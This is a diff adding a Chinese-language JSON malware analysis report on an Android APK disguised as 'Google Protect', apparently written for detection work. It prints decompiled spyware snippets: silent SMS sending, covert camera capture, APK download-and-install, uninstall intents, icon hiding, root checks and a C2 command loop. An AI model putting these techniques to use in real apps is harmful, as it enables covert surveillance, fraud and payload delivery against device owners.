@@ -1,0 +1,260 @@
+{
+  "APK信息": {
+    "文件名": "04f15f42b3d44142d8d1b44f95877ab4cdec9ba31d74a40cdea687bd833f142c.apk",
+    "sha256": "04f15f42b3d44142d8d1b44f95877ab4cdec9ba31d74a40cdea687bd833f142c",
+    "包名": "com.google.protect",
+    "应用名": "Google Protect",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 576.0
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "cmd",
+          "command",
+          "heartbeat",
+          "poll",
+          "report"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "La\\a\\b\\c;",
+          "method_signature": "while(true)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (this.t.isEmpty() || this.j) { return; } a(this.t.remove(0)); ... while (true) { a.a.b.d.a aVarPoll = this.u.poll(); if (aVarPoll == null) { this.t.clear(); this.j = false; this.r = null; this.x.a(); return; } aVarPoll.a(); }",
+          "malicious_code_snippet_context": "if (this.t.isEmpty() || this.j) { return; } a(this.t.remove(0)); ... while (true) { a.a.b.d.a aVarPoll = this.u.poll(); if (aVarPoll == null) { this.t.clear(); this.j = false; this.r = null; this.x.a(); return; } aVarPoll.a(); }",
+          "behavior_description": "该代码是C2远程控制框架中的命令分发/执行引擎：主循环不断从待执行任务队列 this.t 中取出队首元素并调用 a() 依次执行；清理方法 n() 则从另一队列 this.u 中轮询取出命令对象，逐个调用其 a() 方法执行收尾操作，全部处理完毕后清空队列、重置运行标志 this.j 与当前状态 this.r，并回调 this.x.a() 完成会话清理。数据流向为：远程C2服务器下发的指令被封装为队列中的任务对象（source）→ 本地循环取出并通过 a()/aVarPoll.a() 逐条执行（sink），执行后清除痕迹。结合高度混淆的类路径 La\\a\\b\\c; 及已确认的恶意样本背景，这是典型的RAT命令调度器实现。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\google\\protect\\a\\j;",
+          "method_signature": "a(String str, String str2)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager.getDefault().sendTextMessage(str, null, str2, null, null);",
+          "malicious_code_snippet_context": "  \n      public static boolean a(String str, String str2) {\n          try {\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, null, null);\n              return true;\n          } catch (Exception e) {\n              e.printStackTrace();",
+          "behavior_description": "该方法通过 SmsManager.getDefault().sendTextMessage() 静默发送短信，目标号码(str)和短信内容(str2)均由上层调用者传入（结合上下文的JSON数据收集逻辑，很可能来自C2服务器下发指令或硬编码的增值服务号码），发送过程无任何用户界面提示或用户确认，属于典型的短信欺诈行为，可导致用户在不知情的情况下被订阅付费服务或产生高额话费损失。此外，该类伪装在 com.google.protect 包路径下冒充Google官方组件，进一步印证其恶意意图。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "root_exploitation",
+      "中文名": "Root提权",
+      "MITRE": "T1407",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "superuser"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\google\\protect\\b\\d;",
+          "method_signature": "c()",
+          "malicious_behavior": "root_exploitation",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "File file = new File(\"/system/app\");\nreturn file.exists() && file.isDirectory() && (fileArrListFiles = file.listFiles(new a(new String[]{\"superuser\"}))) != null && fileArrListFiles.length > 1;\n...\nRuntime.getRuntime().exec(new String[]{\"/system/xbin/which\", \"su\"}).getInputStream()",
+          "malicious_code_snippet_context": "      private static boolean c() {\n          File[] fileArrListFiles;\n          try {\n>>>             File file = new File(\"/system/app\");\n>>>             return file.exists() && file.isDirectory() && (fileArrListFiles = file.listFiles(new a(new String[]{\"superuser\"}))) != null && fileArrListFiles.length > 1;\n>>>         } catch (Exception unused) {\n>>>             return false;\n          }\n      }\n  ",
+          "behavior_description": "该代码位于伪装成Google包名的 com.google.protect 类中，是一套典型的root环境检测模块。方法c()读取 /system/app 系统目录的文件列表，过滤文件名包含 \"superuser\" 的文件以判断设备是否已安装Superuser（即已root）；相邻方法还检测 \"substrate\"/\"cydia\"（Cydia Substrate框架痕迹），并通过执行 /system/xbin/which su 命令检测su提权二进制是否存在。数据流向：读取系统目录文件列表/命令执行输出（source）→ 判断root痕迹是否存在并返回检测结果（sink）。在已确认的恶意样本中，该检测是提权利用链的前置侦察步骤，用于判断设备是否已具备root权限，以便后续利用root权限进行静默安装、系统级持久化或绕过安全限制等恶意操作。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "anti_detection",
+      "中文名": "反检测/对抗技术",
+      "MITRE": "T1426",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "anti_root",
+          "中文名": "反Root",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "superuser"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\google\\protect\\b\\d;",
+          "method_signature": "c()",
+          "malicious_behavior": "anti_detection",
+          "behavior_type": "grayware",
+          "risk_level": "低",
+          "malicious_code_snippet": "File file = new File(\"/system/app\");\nreturn file.exists() && file.isDirectory() && (fileArrListFiles = file.listFiles(new a(new String[]{\"superuser\"}))) != null && fileArrListFiles.length > 1;",
+          "malicious_code_snippet_context": "      private static boolean c() {\n          File[] fileArrListFiles;\n          try {\n>>>             File file = new File(\"/system/app\");\n>>>             return file.exists() && file.isDirectory() && (fileArrListFiles = file.listFiles(new a(new String[]{\"superuser\"}))) != null && fileArrListFiles.length > 1;\n          } catch (Exception unused) {\n              return false;\n          }",
+          "behavior_description": "该方法枚举 /system/app 目录中文件名包含 \"superuser\" 关键字的文件，若数量超过1个则判定设备已 Root。结合同类中其他方法（检测 substrate/cydia 挂载框架文件、通过 Runtime.exec 执行 /system/xbin/which su 定位 su 二进制），构成一套完整的 Root 环境检测体系。数据流向：读取系统目录文件列表（source: File.listFiles 枚举 /system/app）→ 生成 Root 环境判定布尔结果（sink: 检测结果返回给调用方），该结果被恶意样本用于识别安全研究人员常用的 Root 设备/模拟器环境并规避动态分析。代码位于伪装成 Google 官方包名的 com.google.protect 类中，具有明显的欺骗性和反检测意图，但该代码本身仅做文件存在性检查，不直接窃取数据或造成用户损失，属于间接风险的反分析对抗行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        },
+        {
+          "子行为": "silent_uninstall",
+          "中文名": "静默卸载",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "android.intent.action.DELETE"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\google\\protect\\a\\l;",
+          "method_signature": "if(i != -1)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "int i = inputStream.read(bArr);\nfileOutputStream.write(bArr, 0, i);\nIntent intent = new Intent(\"android.intent.action.VIEW\");\nintent.setDataAndType(Uri.fromFile(new File(str + \"update.apk\")), \"application/vnd.android.package-archive\");\nintent.setFlags(268435457);\nthis.f4239a.startActivity(intent);",
+          "malicious_code_snippet_context": "              InputStream inputStream = httpURLConnection.getInputStream();\n              byte[] bArr = new byte[1024];\n              while (true) {\n>>>                 int i = inputStream.read(bArr);\n>>>                 if (i != -1) {\n>>>                     fileOutputStream.write(bArr, 0, i);\n>>>                 } else {\n>>>                     fileOutputStream.close();\n>>>                     inputStream.close();\n                      Intent intent = new Intent(\"android.intent.action.VIEW\");\n                      intent.setDataAndType(Uri.fromFile(new File(str + \"update.apk\")), \"application/vnd.android.package-archive\");\n                      intent.setFlags(268435457);",
+          "behavior_description": "该代码位于伪装成Google组件的com.google.protect包中，通过HTTPURLConnection从远程服务器静默下载APK并写入本地update.apk文件，下载完成后构造ACTION_VIEW Intent（MIME类型为application/vnd.android.package-archive，设置FLAG_ACTIVITY_NEW_TASK|FLAG_GRANT_READ_URI_PERMISSION标志）调起系统安装器诱导用户安装该APK。数据流向：远程服务器(HTTP输入流)→本地文件update.apk→系统包安装器(startActivity安装Intent)。作为已确认恶意样本的自我更新/二次载荷投递机制，下载过程完全无用户感知，安装环节虽弹出系统确认框，但以\"更新\"为名诱导用户点击确认，属于典型的下载器/投放器(dropper)行为，可被用于投放新版本恶意软件或额外恶意载荷。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lcom\\google\\protect\\a\\a;",
+          "method_signature": "a(String str, Context context)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.DELETE\");\nintent.setData(Uri.parse(\"package:\" + str));\nintent.addFlags(268435456);\ncontext.startActivity(intent);",
+          "malicious_code_snippet_context": "      }\n  \n      public static JSONObject a(String str, Context context) {\n>>>         Intent intent = new Intent(\"android.intent.action.DELETE\");\n>>>         intent.setData(Uri.parse(\"package:\" + str));\n>>>         intent.addFlags(268435456);\n>>>         context.startActivity(intent);\n          return a();\n      }\n  ",
+          "behavior_description": "该方法位于伪装成Google包名(com.google.protect)的恶意类中，接收目标应用包名str，构造ACTION_DELETE卸载意图（数据为package:URI，附加FLAG_ACTIVITY_NEW_TASK=268435456以便从非Activity上下文启动），调用startActivity拉起系统卸载流程以移除指定应用。结合同类代码中枚举已安装应用列表并统计银行类应用数量(isBankSize)的逻辑，该卸载功能典型用于删除安全/杀毒软件或指定竞争应用，帮助恶意样本规避查杀、维持自身驻留。数据流向：枚举/外部指定的目标包名(str参数)→构造ACTION_DELETE卸载Intent→startActivity触发目标应用卸载。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.CAMERA"
+        ],
+        "字符串": [
+          "takePicture"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\google\\protect\\a\\c;",
+          "method_signature": "if(camera != null)",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.f4221a = Camera.open(i);\nthis.f4221a.setPreviewTexture(new SurfaceTexture(0));\nthis.f4221a.startPreview();\ncamera.takePicture(null, null, new Camera.PictureCallback() {\n    public void onPictureTaken(byte[] bArr, Camera camera2) {\n        c.this.a(bArr);\n    }\n});",
+          "malicious_code_snippet_context": "      }\n  \n      public void a(int i) {\n>>>         this.f4221a = Camera.open(i);\n>>>         this.f4221a.setParameters(this.f4221a.getParameters());\n>>>         try {\n>>>             this.f4221a.setPreviewTexture(new SurfaceTexture(0));\n>>>             this.f4221a.startPreview();\n>>>         } catch (Exception e) {\n>>>             e.printStackTrace();\n>>>         }\n          Camera camera = this.f4221a;\n          if (camera != null) {\n              camera.takePicture(null, null, new Camera.PictureCallback() { // from class: com.google.protect.a.c.1",
+          "behavior_description": "该代码隐藏在伪造的 com.google.protect 包名下（伪装成Google官方包以逃避怀疑），实现典型的间谍软件隐蔽拍照流程：通过 Camera.open(i) 打开指定摄像头（通常为前置摄像头），使用空的 SurfaceTexture(0) 作为预览载体使预览画面完全不可见，调用 startPreview() 启动隐形预览，再通过 takePicture(null, null, callback) 静默拍照（快门回调传 null 即无快门声），整个拍摄过程用户毫无感知。数据流向：摄像头硬件采集图像 → onPictureTaken(byte[] bArr) 回调接收 JPEG 图像字节数据 → 传入内部方法 a(bArr) 进行后续处理（此类样本中通常为压缩后上传至远程C2服务器），构成对用户环境的视觉隐私窃取。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\google\\protect\\ui\\StartActivity;",
+          "method_signature": "onClick(View view)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "StartActivity.this.startActivity(new Intent(startActivity, MainActivity.class));\nStartActivity.this.getPackageManager().setComponentEnabledSetting(new ComponentName(StartActivity.this, StartActivity.class), 2, 1);\nStartActivity.this.finish();",
+          "malicious_code_snippet_context": "StartActivity.this.startActivity(new Intent(startActivity, MainActivity.class));\nStartActivity.this.getPackageManager().setComponentEnabledSetting(new ComponentName(StartActivity.this, StartActivity.class), 2, 1);\nStartActivity.this.finish();",
+          "behavior_description": "用户点击'启用'按钮后，代码先启动 MainActivity，随后调用 PackageManager.setComponentEnabledSetting() 将应用的桌面入口组件 StartActivity 设置为禁用状态（参数值2 = COMPONENT_ENABLED_STATE_DISABLED），并 finish 当前界面。数据流向：用户点击事件→setComponentEnabledSetting 禁用 launcher Activity→应用图标从桌面启动器中消失。该样本伪装为 com.google.protect（仿谷歌包名），通过隐藏图标使用户难以察觉和卸载应用，实现隐蔽驻留，为后续恶意行为提供掩护，属于典型的恶意规避/持久化技术。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
